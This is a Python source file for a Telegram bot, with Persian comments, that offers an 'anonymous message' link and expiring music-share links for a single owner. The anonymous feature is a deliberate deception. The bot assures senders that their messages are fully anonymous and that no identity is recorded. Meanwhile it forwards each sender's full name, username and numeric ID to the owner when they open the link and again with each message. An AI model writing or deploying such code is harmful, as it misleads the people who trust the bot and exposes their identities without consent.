import os
import time
import uuid
from aiohttp import web
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    BotCommand,
    BotCommandScopeChat,
    MenuButtonCommands,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# شناسه انحصاری مالک ربات (عباس)
OWNER_ID = 6073046430
OWNER_DISPLAY_NAME = "Ả̸̱̻͕̜͔̗̹͗̐̏̄͜͝͝M̶͋̅͠"

# نگهداری وضعیت‌ها در حافظه
shared_music = {}
pending_uploads = {}
users_in_anon_mode = set()  # کاربرانی که در حال نوشتن پیام ناشناس هستند


async def health_check(request):
    """وب‌سرور برای زنده نگه داشتن سرور در Render توسط UptimeRobot"""
    return web.Response(text="Bot is running!")


async def start_web_server():
    app = web.Application()
    app.router.add_get("/", health_check)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()


def format_remaining_time(remaining_seconds):
    """فرمت‌بندی زمان باقی‌مانده"""
    if remaining_seconds is None:
        return "♾ همیشگی (بدون انقضا)"
    if remaining_seconds <= 0:
        return "⚠️ منقضی شده"
    hours = int(remaining_seconds // 3600)
    minutes = int((remaining_seconds % 3600) // 60)
    seconds = int(remaining_seconds % 60)

    if hours >= 24:
        days = hours // 24
        return f"{days} روز و {hours % 24} ساعت"
    elif hours > 0:
        return f"{hours} ساعت و {minutes} دقیقه"
    else:
        return f"{minutes} دقیقه و {seconds} ثانیه"


async def delete_expired_message(context: ContextTypes.DEFAULT_TYPE):
    """حذف پیام پس از پایان مدت انقضا"""
    data = context.job.data
    chat_id = data.get("chat_id")
    message_id = data.get("message_id")
    music_id = data.get("music_id")

    if music_id and music_id in shared_music:
        del shared_music[music_id]

    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        pass


async def post_init(application):
    """تنظیم رسمی دکمه منو در کنار سنجاقک تلگرام"""
    owner_commands = [
        BotCommand("my_musics", "📋 لیست و تایم موزیک‌های فعال"),
        BotCommand("anon_link", "🔗 دریافت لینک پیام ناشناس"),
        BotCommand("help", "ℹ️ راهنما و وضعیت ربات"),
        BotCommand("start", "🔄 شروع مجدد"),
    ]
    try:
        await application.bot.set_my_commands(
            owner_commands, scope=BotCommandScopeChat(chat_id=OWNER_ID)
        )
        await application.bot.set_chat_menu_button(
            chat_id=OWNER_ID, menu_button=MenuButtonCommands()
        )
    except Exception as e:
        print(f"منوی اختصاصی تنظیم نشد: {e}")

    default_commands = [
        BotCommand("start", "شروع ربات"),
    ]
    try:
        await application.bot.set_my_commands(default_commands)
    except Exception:
        pass


async def send_anon_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """ارسال لینک ناشناس برای مالک ربات"""
    if update.effective_user.id != OWNER_ID:
        return
    bot_info = await context.bot.get_me()
    anon_url = f"https://t.me/{bot_info.username}?start=anon_chat"
    text = (
        "🎭 **لینک اختصاصی ربات پیام ناشناس شما:**\n\n"
        f"`{anon_url}`\n\n"
        "💡 این لینک را کپی کنید و در بیو تلگرام، اینستاگرام یا هر جا خواستید قرار دهید.\n"
        "هرکس روی آن کلیک کند، به عنوان فرستنده ناشناس به شما وصل می‌شود و هم‌زمان مشخصات کاملش برایتان ارسال می‌گردد!"
    )
    await update.message.reply_text(text, parse_mode="Markdown")


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    args = context.args

    # ۱. اگر مخاطب از طریق لینک پیام ناشناس وارد شده باشد
    if args and len(args) > 0 and args[0] == "anon_chat":
        if user.id == OWNER_ID:
            await update.message.reply_text("این لینک پیام ناشناس خود شماست! آن را برای دوستانتان بفرستید.")
            return

        users_in_anon_mode.add(user.id)

        # پیام به شخص فرستنده
        welcome_anon = (
            f"🎭 **شما در حال ارسال پیام ناشناس به «{OWNER_DISPLAY_NAME}» هستید.**\n\n"
            "پیام شما (متن، وویس، موزیک، عکس یا ویدیو) به صورت کاملاً ناشناس و بدون ثبت هویت برای ایشان ارسال خواهد شد.\n\n"
            "✍️ لطفاً پیام خود را بنویسید و ارسال کنید:"
        )
        await update.message.reply_text(welcome_anon, parse_mode="Markdown")

        # نوتیفیکیشن هشدار آنی برای شما (مالک)
        username_str = f"@{user.username}" if user.username else "ندارد"
        alert_text = (
            "🔔 **ورود مخاطب به ربات پیام ناشناس!**\n\n"
            "یک کاربر هم‌اکنون لینک ناشناس را باز کرد و در حال ارسال پیام است:\n"
            f"👤 **نام:** {user.full_name}\n"
            f"🔗 **یوزرنیم:** {username_str}\n"
            f"🆔 **آیدی عددی:** `{user.id}`"
        )
        try:
            await context.bot.send_message(chat_id=OWNER_ID, text=alert_text, parse_mode="Markdown")
        except Exception:
            pass
        return

    # ۲. اگر کاربر با لینک موزیک وارد شده باشد
    if args and len(args) > 0 and args[0].startswith("music_"):
        music_id = args[0]
        if music_id in shared_music:
            data = shared_music[music_id]
            caption = data.get("caption") or f"🎵 {data.get('name', 'موزیک ارسالی')}"

            if data["file_type"] == "audio":
                sent = await context.bot.send_audio(
                    chat_id=user.id, audio=data["file_id"], caption=caption
                )
            elif data["file_type"] == "voice":
                sent = await context.bot.send_voice(
                    chat_id=user.id, voice=data["file_id"], caption=caption
                )
            else:
                sent = await context.bot.send_document(
                    chat_id=user.id, document=data["file_id"], caption=caption
                )

            duration = data.get("duration_sec")
            if duration:
                elapsed = time.time() - data["created_at"]
                remaining = max(1, duration - elapsed)
                context.job_queue.run_once(
                    delete_expired_message,
                    remaining,
                    data={"chat_id": user.id, "message_id": sent.message_id},
                )
        else:
            await update.message.reply_text("❌ متأسفانه این لینک منقضی یا باطل شده است.")
        return

    # ۳. استارت معمولی
    if user.id == OWNER_ID:
        try:
            await context.bot.set_chat_menu_button(
                chat_id=user.id, menu_button=MenuButtonCommands()
            )
        except Exception:
            pass

        await update.message.reply_text(
            "سلام عباس عزیز! خوش آمدی 👋\n\n"
            "🤖 **ربات پیام ناشناس و موزیک شما آماده است.**\n"
            "🔘 از دکمه **Menu** کنار سنجاقک می‌توانی لینک پیام ناشناس خود را بگیری یا موزیک‌هایت را مدیریت کنی.\n\n"
            "برای اشتراک موزیک، کافیست فایل صوتی خود را بفرستید."
        )
    else:
        await update.message.reply_text("سلام! برای استفاده از امکانات، لطفاً از لینکی که دریافت کرده‌اید وارد شوید.")


async def handle_anon_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """مدیریت پیام ارسالی از طرف کاربر ناشناس و فوروارد به مالک همراه با هویت"""
    user = update.effective_user
    msg = update.message

    if user.id not in users_in_anon_mode:
        return

    username_str = f"@{user.username}" if user.username else "ندارد"
    info_header = (
        "📩 **پیام ناشناس جدید دریافت شد!**\n\n"
        f"👤 **فرستنده:** {user.full_name}\n"
        f"🔗 **یوزرنیم:** {username_str}\n"
        f"🆔 **شناسه عددی:** `{user.id}`\n"
        "─────────────────"
    )

    # ابتدا شناسنامه فرد برای شما ارسال می‌شود
    await context.bot.send_message(chat_id=OWNER_ID, text=info_header, parse_mode="Markdown")

    # پیام یا فایل فرد برای شما فوروارد/کپی می‌شود
    await context.bot.copy_message(
        chat_id=OWNER_ID,
        from_chat_id=msg.chat_id,
        message_id=msg.message_id
    )

    # تاییدیه به فرستنده
    await msg.reply_text("✅ پیام شما به صورت ناشناس ارسال شد!")
    users_in_anon_mode.discard(user.id)


async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    text = (
        "ℹ️ **راهنمای ربات پیام ناشناس و موزیک:**\n\n"
        "1️⃣ **دریافت پیام ناشناس:** از منوی کنار سنجاقک گزینه `دریافت لینک پیام ناشناس` را بزنید.\n"
        "2️⃣ **ارسال موزیک تایم‌دار:** فایل صوتی خود را بفرستید تا زمان انقضایش را انتخاب کنید.\n"
        "3️⃣ **مدیریت:** از طریق دکمه منو به لیست و زمان باقی‌مانده دسترسی دارید."
    )
    await update.message.reply_text(text, parse_mode="Markdown")


async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id != OWNER_ID:
        return

    msg = update.message
    file_id = None
    file_type = None
    file_name = "موزیک نامشخص"

    if msg.audio:
        file_id = msg.audio.file_id
        file_type = "audio"
        file_name = msg.audio.title or msg.audio.file_name or "فایل صوتی"
    elif msg.voice:
        file_id = msg.voice.file_id
        file_type = "voice"
        file_name = "پیام صوتی (Voice)"
    elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("audio/"):
        file_id = msg.document.file_id
        file_type = "document"
        file_name = msg.document.file_name or "فایل صوتی"

    if not file_id:
        return

    temp_id = uuid.uuid4().hex[:6]
    pending_uploads[temp_id] = {
        "file_id": file_id,
        "file_type": file_type,
        "name": file_name,
        "caption": msg.caption,
        "message_id": msg.message_id,
        "chat_id": msg.chat_id,
    }

    keyboard = [
        [
            InlineKeyboardButton("⚡️ ۱ ساعت", callback_data=f"exp_{temp_id}_3600"),
            InlineKeyboardButton("⏳ ۶ ساعت", callback_data=f"exp_{temp_id}_21600"),
        ],
        [
            InlineKeyboardButton("🌙 ۱۲ ساعت", callback_data=f"exp_{temp_id}_43200"),
            InlineKeyboardButton("☀️ ۲۴ ساعت", callback_data=f"exp_{temp_id}_86400"),
        ],
        [
            InlineKeyboardButton("🗓 ۳ روز", callback_data=f"exp_{temp_id}_259200"),
            InlineKeyboardButton("♾ بدون انقضا (دائمی)", callback_data=f"exp_{temp_id}_0"),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await msg.reply_text(
        f"🎧 فایل دریافت شد: **{file_name}**\n\n⏱ مدت اعتبار لینک برای دیگران چقدر باشد؟",
        reply_markup=reply_markup,
        parse_mode="Markdown",
    )


async def duration_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.from_user.id != OWNER_ID:
        return

    data = query.data
    _, temp_id, sec_str = data.split("_")
    duration_sec = int(sec_str) if sec_str != "0" else None

    if temp_id not in pending_uploads:
        await query.edit_message_text("⚠️ این فایل قبلاً ثبت شده یا منقضی شده است.")
        return

    info = pending_uploads.pop(temp_id)
    music_id = f"music_{uuid.uuid4().hex[:8]}"
    bot_info = await context.bot.get_me()
    share_link = f"https://t.me/{bot_info.username}?start={music_id}"

    shared_music[music_id] = {
        "file_id": info["file_id"],
        "file_type": info["file_type"],
        "name": info["name"],
        "caption": info["caption"],
        "created_at": time.time(),
        "duration_sec": duration_sec,
        "owner_chat_id": info["chat_id"],
        "owner_msg_id": info["message_id"],
        "reply_msg_id": query.message.message_id,
    }

    keyboard = [
        [InlineKeyboardButton("🗑 حذف فوری و ابطال لینک", callback_data=f"del_{music_id}")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    duration_text = format_remaining_time(duration_sec)
    await query.edit_message_text(
        f"✅ **لینک موزیک با موفقیت ساخته شد!**\n\n"
        f"🎵 نام: `{info['name']}`\n"
        f"⏱ مدت اعتبار: **{duration_text}**\n\n"
        f"🔗 **لینک اشتراک:**\n`{share_link}`",
        reply_markup=reply_markup,
        parse_mode="Markdown",
    )

    if duration_sec:
        context.job_queue.run_once(
            delete_expired_message,
            duration_sec,
            data={"chat_id": info["chat_id"], "message_id": info["message_id"], "music_id": music_id},
        )
        context.job_queue.run_once(
            delete_expired_message,
            duration_sec,
            data={"chat_id": info["chat_id"], "message_id": query.message.message_id},
        )


async def list_my_musics(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if user.id != OWNER_ID:
        return

    if not shared_music:
        await update.message.reply_text("📭 در حال حاضر هیچ موزیک فعالی نداری!")
        return

    bot_info = await context.bot.get_me()
    await update.message.reply_text("📋 **لیست موزیک‌های فعال و زمان باقی‌مانده:**", parse_mode="Markdown")

    for m_id, item in list(shared_music.items()):
        if item["duration_sec"]:
            elapsed = time.time() - item["created_at"]
            rem = item["duration_sec"] - elapsed
            rem_text = format_remaining_time(rem)
        else:
            rem_text = "♾ همیشگی (بدون انقضا)"

        link = f"https://t.me/{bot_info.username}?start={m_id}"
        keyboard = [
            [InlineKeyboardButton("🗑 حذف این موزیک", callback_data=f"del_{m_id}")]
        ]
        text = (
            f"🎵 **نام:** `{item['name']}`\n"
            f"⏳ **تایم باقی‌مانده:** `{rem_text}`\n\n"
            f"🔗 **لینک:**\n`{link}`"
        )
        await update.message.reply_text(
            text,
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="Markdown",
        )


async def delete_button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    if query.from_user.id != OWNER_ID:
        await query.answer("شما اجازه دسترسی ندارید!", show_alert=True)
        return

    callback_data = query.data
    if callback_data.startswith("del_"):
        music_id = callback_data.replace("del_", "")

        if music_id in shared_music:
            data = shared_music.pop(music_id)
            try:
                await context.bot.delete_message(chat_id=data["owner_chat_id"], message_id=data["owner_msg_id"])
            except Exception:
                pass
            try:
                await context.bot.delete_message(chat_id=data["owner_chat_id"], message_id=data["reply_msg_id"])
            except Exception:
                pass

            await query.edit_message_text(f"🗑 فایل `{data.get('name', '')}` حذف شد و لینکش باطل گردید.")
        else:
            await query.edit_message_text("این فایل قبلاً باطل شده است.")


def main():
    token = os.environ.get("BOT_TOKEN")
    if not token:
        raise ValueError("BOT_TOKEN تنظیم نشده است!")

    application = (
        ApplicationBuilder()
        .token(token)
        .post_init(post_init)
        .build()
    )

    # سرور سبک برای UptimeRobot
    application.job_queue.run_once(lambda ctx: start_web_server(), 0)

    # دستورات منوی تلگرام
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("my_musics", list_my_musics))
    application.add_handler(CommandHandler("anon_link", send_anon_link))
    application.add_handler(CommandHandler("help", show_help))

    # هندلر دریافت پیام‌های ناشناس از کاربران
    application.add_handler(
        MessageHandler(
            (~filters.COMMAND) & (~filters.User(user_id=OWNER_ID)),
            handle_anon_message,
        )
    )

    # هندلر فایل‌های صوتی مالک
    application.add_handler(
        MessageHandler(
            (filters.AUDIO | filters.VOICE | filters.Document.Category("audio/")) & filters.User(user_id=OWNER_ID),
            handle_audio,
        )
    )

    # دکمه‌های شیشه‌ای
    application.add_handler(CallbackQueryHandler(duration_callback, pattern=r"^exp_"))
    application.add_handler(CallbackQueryHandler(delete_button_callback, pattern=r"^del_"))

    print("ربات پیام ناشناس و موزیک فعال شد...")
    application.run_polling()


if __name__ == "__main__":
    main()
